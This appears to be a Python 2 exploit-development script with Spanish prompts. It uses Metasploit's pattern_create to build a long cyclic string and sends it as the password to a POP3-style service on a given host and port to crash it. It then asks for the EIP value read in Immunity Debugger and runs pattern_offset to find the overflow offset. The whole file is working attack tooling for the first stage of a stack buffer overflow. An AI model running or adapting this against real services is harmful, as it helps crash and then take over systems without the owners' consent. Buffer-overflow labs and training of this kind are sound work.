import sys,socket
import subprocess
#puerto = 110
try:
    host = str(sys.argv[1])
    puerto = str(sys.argv[2])
    Cant_Bytes = int(sys.argv[3])
except IndexError:
    print "USO : python %s <direccion_IP> <puerto> <Cantidad de bytes >" %sys.argv[0]
    sys.exit()
    #Si el Directorio de metasploit en su maquina es distinto cambiarlo 
msfpattern = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {} ".format(Cant_Bytes)
buffer = subprocess.check_output(msfpattern, shell=True)
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,int(puerto)))
    s.recv(1024)
    s.send('USER Anon\r\n')
    s.recv(1023)
    s.send('PASS '+buffer+'\r\n' )
    s.send('QUIT\r\n')
    s.close()
except:
    print ("Algo ha ido mal...")
    sys.exit()
    
memoryoffset = input("Introduce la direccion de memoria del EIP en el immunity debugger despues del crash...: ")
print "El offset es... "
msfoffset = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {}".format(memoryoffset)
print(subprocess.check_output(msfoffset, shell=True))
